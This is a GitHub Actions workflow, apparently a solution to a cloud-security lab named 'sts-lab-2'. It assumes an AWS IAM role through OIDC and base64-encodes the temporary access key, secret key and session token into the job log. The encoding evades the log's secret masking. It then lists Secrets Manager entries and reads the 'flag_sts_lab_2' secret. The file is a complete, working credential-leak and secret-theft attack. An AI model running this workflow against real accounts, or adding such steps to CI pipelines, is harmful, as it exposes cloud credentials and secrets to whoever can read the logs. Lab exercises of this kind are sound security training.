name: "test AWS Access"

on:
  push:
    branches:
      - main

permissions:
  id-token: write
  contents: read

jobs:
  aws:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::441564410720:role/sts-lab-2-target
          aws-region: eu-west-1
          role-session-name: OIDCSession

      - name: Print AWS Environment Variables
        run: |
          echo "AWS_ACCESS_KEY_ID: $(echo -n $AWS_ACCESS_KEY_ID | base64)"
          echo "AWS_SECRET_ACCESS_KEY: $(echo -n $AWS_SECRET_ACCESS_KEY | base64)"
          echo "AWS_SESSION_TOKEN: $(echo -n $AWS_SESSION_TOKEN | base64)"
        shell: bash

      - name: Verify AWS Identity
        run: aws sts get-caller-identity
        shell: bash

      - name: List Secrets
        run: aws secretsmanager list-secrets --region eu-west-1
        shell: bash

      - name: Get Secret Value
        run: aws secretsmanager get-secret-value --secret-id flag_sts_lab_2 --region eu-west-1
        shell: bash
